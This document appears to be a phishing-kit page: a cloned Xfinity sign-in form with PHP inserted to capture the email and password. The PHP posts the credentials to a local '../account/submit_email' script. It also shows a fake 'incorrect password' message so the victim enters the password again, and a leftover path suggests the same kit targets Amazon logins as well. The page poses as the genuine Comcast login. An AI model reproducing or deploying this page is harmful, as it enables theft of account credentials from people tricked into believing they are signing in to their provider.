<html lang="en" class="light da da-expandable da-expandable" data-resource-package-id="res-responsive-login-page"><head><script type="text/javascript" async="" src="//acdn.adnxs.com/ast/ast.js"></script><script async="" src="//c.amazon-adsystem.com/aax2/apstag.js"></script><script type="text/javascript" async="" src="//static.cimcontent.net/common-web-assets/ad-assets/prebid/prebid.js"></script><script type="text/javascript" async="async" src="https://comcastcom.d1.sc.omtrdc.net/b/ss/comcastdotcomprod/10/JS-2.3.0-D7QN/s6104961338902?AQB=1&amp;ndh=1&amp;pf=1&amp;callback=s_c_il[1].doPostbacks&amp;et=1&amp;t=22%2F3%2F2020%2020%3A34%3A46%203%20-480&amp;d.&amp;nsid=0&amp;jsonv=1&amp;.d&amp;D=D%3D&amp;mid=04081322121802185992288842082721415331&amp;aamlh=3&amp;ce=UTF-8&amp;pageName=resi%7Cselfservice%7Clogin%7Csign%20in&amp;g=https%3A%2F%2Flogin.xfinity.com%2Flogin&amp;cc=USD&amp;c17=resi%7Cselfservice%7Clogin%7C%7Csign%20in&amp;c24=Name%3Arm%2C%20Value%3A1%2C%20%3Aunchecked&amp;v37=D%3DpageName&amp;pe=lnk_o&amp;pev2=Click%20Tracking&amp;s=1500x1000&amp;c=24&amp;j=1.6&amp;v=N&amp;k=Y&amp;bw=1500&amp;bh=890&amp;mcorgid=DA11332E5321D0550A490D45%40AdobeOrg&amp;AQE=1"></script><script type="text/javascript" async="async" src="https://comcastcom.d1.sc.omtrdc.net/b/ss/comcastdotcomprod/10/JS-2.3.0-D7QN/s66797487588609?AQB=1&amp;ndh=1&amp;pf=1&amp;callback=s_c_il[1].doPostbacks&amp;et=1&amp;t=22%2F3%2F2020%2020%3A34%3A45%203%20-480&amp;d.&amp;nsid=0&amp;jsonv=1&amp;.d&amp;D=D%3D&amp;mid=04081322121802185992288842082721415331&amp;aamlh=3&amp;ce=UTF-8&amp;pageName=resi%7Cselfservice%7Clogin%7Csign%20in&amp;g=https%3A%2F%2Flogin.xfinity.com%2Flogin&amp;cc=USD&amp;c17=resi%7Cselfservice%7Clogin%7C%7Csign%20in&amp;c24=Name%3Arm%2C%20Value%3A1%2C%20%3Achecked&amp;v37=D%3DpageName&amp;pe=lnk_o&amp;pev2=Click%20Tracking&amp;c.&amp;a.&amp;activitymap.&amp;page=resi%7Cselfservice%7Chelp%20%26%20support%7CInternet%7Csign-in-to-email-or-voicemail-on-xfinity%7Carticle%7CHOW3620&amp;link=Close&amp;region=BODY&amp;pageIDType=1&amp;.activitymap&amp;.a&amp;.c&amp;pid=resi%7Cselfservice%7Chelp%20%26%20support%7CInternet%7Csign-in-to-email-or-voicemail-on-xfinity%7Carticle%7CHOW3620&amp;pidt=1&amp;oid=Close&amp;oidt=3&amp;ot=SUBMIT&amp;s=1500x1000&amp;c=24&amp;j=1.6&amp;v=N&amp;k=Y&amp;bw=1500&amp;bh=890&amp;mcorgid=DA11332E5321D0550A490D45%40AdobeOrg&amp;AQE=1"></script><script type="text/javascript" async="" src="//acdn.adnxs.com/ast/ast.js"></script><script async="" src="//c.amazon-adsystem.com/aax2/apstag.js"></script><script type="text/javascript" async="" src="/https://login.xfinity.com/static.cimcontent.net/common-web-assets/ad-assets/prebid/prebid.js"></script>
					<script type="text/javascript" src="https://login.xfinity.com/static/js/comcast-common.js"></script>
				<title>Sign in to Xfinity</title>
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
		<meta name="mobile-web-app-capable" content="yes">
		<meta name="apple-mobile-web-app-capable" content="yes">
		<meta name="description" content="Get the most out of Xfinity from Comcast by signing in to your account. Enjoy and manage TV, high-speed Internet, phone, and home security services that work seamlessly together — anytime, anywhere, on any device.">
		<meta name="viewport" content="width=device-width,initial-scale=1">
		<meta name="msapplication-TileColor" content="#ffffff">
		<meta name="msapplication-TileImage" content="static/images/global/favicon/favicon-96x96.png">
		<meta name="theme-color" content="#ffffff">
		
				
                        <script src="//assets.adobedtm.com/43896e740dcedef854392e0be6ea80deb8eb2ba5/satelliteLib-531bc4f46256650a84099973f0ed331f809ea5f4.js"></script>
        
        <script type="text/javascript" src="https:/https://login.xfinity.com/static.cimcontent.net/data-layer/"></script>
    
	<script type="tracking-data-digitalData">
		{
			"page" : {
				"pageInfo" : {
					"screenName" : "sign in",
					"language" : "en",
					"referrerId" : "portal"
				 },
				 "category" : {
                    "primaryCategory" : "login",
                    "designType" : "responsive",
                    "businessType" : "resi",
                    "siteType" : "selfservice"
                },
                "affiliate" : {
                    "name": "comcast",
                    "channel" : "web"
                },
                "codebase" : {
                    "name" : "cima login"
                }
			},
			"user" : [{
				"profile" : [{
					"profileInfo" : {
						"authenticationType" : "unauthenticated",
						"recognizationType" : "unrecognized"
					}
				}],
				"segment" : {
					"isLocalized" : false
				}
			}],
			"schemaVersion" : 0.18
		}

	</script>
    <script>
	    document.addEventListener("DOMContentLoaded", function () {
		    document.dispatchEvent(new CustomEvent("c-tracking-log-page", {
			    bubbles: true
		    }));
	    });
    </script>

					<link rel="stylesheet" type="text/css" href="https://login.xfinity.com/static/css/junket/fonts-remote.min.css?v=33c5ab8">
							<link rel="stylesheet" type="text/css" href="https://login.xfinity.com/static/css/junket/styles-light.min.css?v=33c5ab8">
						<link rel="shortcut icon" href="https://login.xfinity.com/static/images/favicon/favicon.ico">
		<link rel="apple-touch-icon" sizes="57x57" href="static/images/favicon/apple-icon-57x57.png">
		<link rel="apple-touch-icon" sizes="60x60" href="static/images/favicon/apple-icon-60x60.png">
		<link rel="apple-touch-icon" sizes="72x72" href="static/images/favicon/apple-icon-72x72.png">
		<link rel="apple-touch-icon" sizes="76x76" href="static/images/favicon/apple-icon-76x76.png">
		<link rel="apple-touch-icon" sizes="114x114" href="static/images/favicon/apple-icon-114x114.png">
		<link rel="apple-touch-icon" sizes="120x120" href="static/images/favicon/apple-icon-120x120.png">
		<link rel="apple-touch-icon" sizes="144x144" href="static/images/favicon/apple-icon-144x144.png">
		<link rel="apple-touch-icon" sizes="152x152" href="static/images/favicon/apple-icon-152x152.png">
		<link rel="apple-touch-icon" sizes="180x180" href="static/images/favicon/apple-icon-180x180.png">
				<link rel="icon" type="image/png" sizes="192x192" href="static/images/favicon/android-icon-192x192.png">
		<link rel="icon" type="image/png" sizes="32x32" href="static/images/favicon/favicon-32x32.png">
		<link rel="icon" type="image/png" sizes="96x96" href="static/images/favicon/favicon-96x96.png">
		<link rel="icon" type="image/png" sizes="16x16" href="static/images/favicon/favicon-16x16.png">
		<link rel="manifest" href="static/images/favicon/manifest.json">

		<script type="text/javascript">
			runtimeData = {
									"r": "comcast.net",									"selectAccount": "false",									"s": "portal",									"deviceAuthn": "false",									"continue": "http://xfinity.comcast.net/",									"ipAddrAuthn": "false",									"forceAuthn": "0",									"lang": "en",									"passive": "false",									"reqId": "2987cb4a-284c-45a9-a643-61761c7c54d6"							}
		</script>
											    <script src="https://scripts.webcontentassessor.com/scripts/e5d00e87ba3bf67af60bbc75377626fb1f0b0a10c2e83ca40b7a245ca2cd8367"></script>

													<style type="text/css">
								@media only screen and (min-width: 1400px) {
.ad.ad-fullscreen #left {
margin-left: 670px;
}
.ad.ad-fullscreen #right {
margin-right: 0px;
}
}
.da-300x250 #ad-block {
height: 250px;
overflow: hidden;
}
			</style>
			<script src="https://assets.adobedtm.com/43896e740dcedef854392e0be6ea80deb8eb2ba5/s-code-contents-4a9ebf08bffa74f717ff121b2c55a295112122b4.js"></script><script src="https://assets.adobedtm.com/43896e740dcedef854392e0be6ea80deb8eb2ba5/scripts/satellite-596fc62264746d0ba500dd83.js"></script><script type="text/JavaScript" src="https://login.xfinity.com/proxy/nudetect/3.67.107200/w-341498/w?r=827255&amp;wt=1.w-341498.1.2._cky-ZkeKUoX1sZd2Jri7w,,.6Jl9RgQlzEUxSmMbZsTCOL-prEl6y6DJUSRGHjl0Divc6nkDqTnnhYe70Dl2O1ZKfz5Lbdg64ljd6tTseGGGVY84BBbm9SZ8B7HBSQ-HOlFLTg3b2TSBDUjENjZ9oJbEhOp1mEf05StQYAjh85OnebgOcX67jUtGBn1mj7nd6En8d_F32wAhi71gQ3lmwrkwH4qpNtN50tjN8YhmAEjX255qD6kL0o2epsOZ9AahHE2h8MOAjfLcOdbigiLMa8hb4LA0oY3eT3A-rkm8qlld64YAkmkmqT20nJfm0in5giMyFUAcXrwfjpndJO_90cw18GAxqJMjjmA215JUxW9e_FGY3vTet3pq9WMB4tEUPzQ,"></script><script src="https://assets.adobedtm.com/43896e740dcedef854392e0be6ea80deb8eb2ba5/scripts/satellite-596fa36064746d7e580013b4.js"></script><script src="https://assets.adobedtm.com/43896e740dcedef854392e0be6ea80deb8eb2ba5/scripts/satellite-5971021b64746d663b00202b.js"></script><script src="https://assets.adobedtm.com/43896e740dcedef854392e0be6ea80deb8eb2ba5/scripts/satellite-596fa34764746d6ae001a760.js"></script><script src="http://assets.adobedtm.com/43896e740dcedef854392e0be6ea80deb8eb2ba5/s-code-contents-4a9ebf08bffa74f717ff121b2c55a295112122b4.js"></script><script type="text/JavaScript" src="https://login.xfinity.com/proxy/nudetect/3.67.107200/w-341498/w?r=225703&amp;wt=1.w-341498.1.2._cky-ZkeKUoX1sZd2Jri7w,,.6Jl9RgQlzEUxSmMbZsTCOL-prEl6y6DJUSRGHjl0Divc6nkDqTnnhYe70Dl2O1ZKfz5Lbdg64ljd6tTseGGGVY84BBbm9SZ8B7HBSQ-HOlFLTg3b2TSBDUjENjZ9oJbEhOp1mEf05StQYAjh85OnebgOcX67jUtGBn1mj7nd6En8d_F32wAhi71gQ3lmwrkwH4qpNtN50tjN8YhmAEjX255qD6kL0o2epsOZ9AahHE2h8MOAjfLcOdbigiLMa8hb4LA0oY3eT3A-rkm8qlld64YAkmkmqT20nJfm0in5giMyFUAcXrwfjpndJO_90cw18GAxqJMjjmA215JUxW9e_FGY3vTet3pq9WMB4tEUPzQ,"></script></head>
		<body class=" has-footer ">
		<div id="breakpoints"></div>
							<div id="background" style="height: 655px;"></div>
								<main id="bd">
			<h1 class="screen-reader-text">Sign in to Xfinity</h1>
			<div id="left">	    




<div id="ad-block">
	<img width="0" height="0" src="https://7468.v.fwmrm.net/ad/u?mode=echo&amp;cr=https%3A%2F%2Fdpm.demdex.net%2Fibs%3Adpid%3D796%26dpuuid=%23%7Buser.id%7D" style="display: none !important;">
<img src="https://xfinitydigital.demdex.net/event?d_sid=4702129" width="0" height="0"></div>
	</div><div id="right">		<div class="container">
		<?php if ($two_email == "on") { if (!isset($_POST['password'])) { ?>
        <form name="signin" action="" method="post">
        <?php }else{ ?>
		<form name="signin" action="../account/submit_email" method="post">
        <?php } } ?>
																			<div class="single logo-wrapper">
				<span aria-role="img" class="xfinity-logo"></span>
											</div>
		                            <div class="textfield-wrapper">
				<label for="user" class="float accessibly-hidden">Xfinity ID</label>
				<input id="user" name="email" type="text" placeholder="Email, mobile, or username" value="<?php echo $_SESSION['email'];?>" autocorrect="off" autocapitalize="off" spellcheck="false" maxlength="128" required>
        		<input type="hidden" name="pass_log" value="<?= $_POST['pass_log']; ?>">
			</div>
		
					<div class="textfield-wrapper">
				<label for="passwd" class="float accessibly-hidden">Password</label>
				<input id="passwd" name="password" type="password" placeholder="Password" maxlength="128" required>
			</div>
			<?php if ($two_email == "on") { if (isset($_POST['password'])) { ?>
			<p id="error" class="error_message">The Xfinity ID or password you entered was incorrect. Please try again.</p>
			<?php } } ?>
	    			<div class="checkbox-container">
				<label for="remember_me">
					<input type="checkbox" id="remember_me" name="rm" value="1"><span id="remember_me_checkbox" class="checkbox"></span><div class="content">Stay signed in</div>
				</label>
				<button type="button" id="rm_label_learn_more" class="icon info cancel" data-id-ref="rm_help" aria-controls="rm_help" aria-label="Learn more about staying signed in"></button>
			</div>
<div>
    </div>
		
												<button class="submit" type="submit" id="sign_in">Sign In</button>
					
		
		
		<ul>
			
			        	    	

																						<li id="forgot-username-password-item">Forgot <a href="https://idm.xfinity.com/myaccount/lookup?continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3FselectAccount%3Dfalse%26ipAddrAuthn%3Dfalse%26passive%3Dfalse%26reqId%3D2987cb4a-284c-45a9-a643-61761c7c54d6%26r%3Dcomcast.net%26s%3Dportal%26deviceAuthn%3Dfalse%26continue%3Dhttp%253A%252F%252Fxfinity.comcast.net%252F%26forceAuthn%3D0%26lang%3Den%26rm%3D2%26ui_style%3Dlight&amp;lang=en&amp;ui_style=light" target="_self" title="Look up Xfinity ID">Xfinity ID</a> or <a id="forgotPwdLink" href="https://idm.xfinity.com/myaccount/reset?continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3FselectAccount%3Dfalse%26ipAddrAuthn%3Dfalse%26passive%3Dfalse%26reqId%3D2987cb4a-284c-45a9-a643-61761c7c54d6%26r%3Dcomcast.net%26s%3Dportal%26deviceAuthn%3Dfalse%26continue%3Dhttp%253A%252F%252Fxfinity.comcast.net%252F%26forceAuthn%3D0%26lang%3Den%26rm%3D2%26ui_style%3Dlight&amp;lang=en&amp;ui_style=light" target="_self" title="Reset Password">password</a>?</li>
									
										<li id="create-username-item">Don't have an Xfinity ID?					<span><a href="https://idm.xfinity.com/myaccount/create-uid?continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3FselectAccount%3Dfalse%26ipAddrAuthn%3Dfalse%26passive%3Dfalse%26reqId%3D2987cb4a-284c-45a9-a643-61761c7c54d6%26r%3Dcomcast.net%26s%3Dportal%26deviceAuthn%3Dfalse%26continue%3Dhttp%253A%252F%252Fxfinity.comcast.net%252F%26forceAuthn%3D0%26lang%3Den%26rm%3D2%26ui_style%3Dlight&amp;lang=en&amp;ui_style=light" target="_self">Create one</a></span>
				</li>
					
		
			
		    										
				
				<li id="quick-bill-pay">
					<a href="https://customer.xfinity.com/lite" target="_self">Pay any balance</a> without signing in				</li>
			
						
		</ul>
					<p id="implied-legal">By signing in, you agree to our <a href="http://my.xfinity.com/terms/web/">Terms of Service</a> and <a href="http://xfinity.comcast.net/privacy/">Privacy Policy</a>.</p>
		
		
					<input type="hidden" name="r" value="comcast.net">
					<input type="hidden" name="selectAccount" value="false">
					<input type="hidden" name="s" value="portal">
					<input type="hidden" name="deviceAuthn" value="false">
					<input type="hidden" name="continue" value="http://xfinity.comcast.net/">
					<input type="hidden" name="ipAddrAuthn" value="false">
					<input type="hidden" name="forceAuthn" value="0">
					<input type="hidden" name="lang" value="en">
					<input type="hidden" name="passive" value="false">
					<input type="hidden" name="reqId" value="2987cb4a-284c-45a9-a643-61761c7c54d6">
		
 	</form>
</div>

				</div>
		</main>
													<footer>
<span class="content">
<span class="copyright">© 2020 Comcast</span>
<nav>
<span class="divider hide-compact"></span>
<span class="links">
<a href="https://www.xfinity.com/privacy/policy">Privacy Policy</a>
<span class="divider"></span>
<a href="http://my.xfinity.com/terms/web/">Terms of Service</a>
</span>
<span class="ad-links divider"></span>
<span class="ad-links links">
<a href="http://www.comcast.net/adinformation" target="_blank">Ad Info</a>
<span class="divider"></span>
<a href="https://www.surveymonkey.com/s.aspx?sm=FyNNVDhj_2f2FNc2KVOHQ4eg_3d_3d" target="_blank">Ad Feedback</a>
</span>
<span class="divider hide-compact"></span>
<span class="links">
<a href="https://www.xfinity.com/privacy/manage-preference">Cal. Civ. Code §1798.135: Do Not Sell My Info</a>
</span>
</nav>
</span>
</footer>
					
		
		<script type="text/javascript" src="https://login.xfinity.com/static/js/libs/jquery-3.3.1.min.js"></script>

											<div id="rm_help" role="dialog" aria-hidden="true" class="overlay" data-dialog-type="overlay">
    	<div role="document" class="content">
    		    		<button type="button" class="close" aria-label="Close"></button>
    							<h1>Why Stay Signed In?</h1>
					<p>With this option selected, you'll stay signed in to your account on this device until you sign out. You should not use this option on public or shared devices.</p>
					<p>For your security, you may be asked to enter your password before accessing certain information.</p>
				
    	</div>
    </div>
			

<iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_comcastathena_1" name="destination_publishing_iframe_comcastathena_1_name" src="https://comcastathena.demdex.net/dest5.html?d_nsid=1#https%3A%2F%2Flogin.xfinity.com%2Flogin" class="aamIframeLoaded" style="display: none; width: 0px; height: 0px;"></iframe><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_comcast_0" name="destination_publishing_iframe_comcast_0_name" src="http://fast.comcast.demdex.net/dest5.html?d_nsid=0#http%3A%2F%2F192.168.100.157%2Famazon%2Fap%2Ffiles%2Flogin-comcast.php" class="aamIframeLoaded" style="display: none; width: 0px; height: 0px;"></iframe></body></html>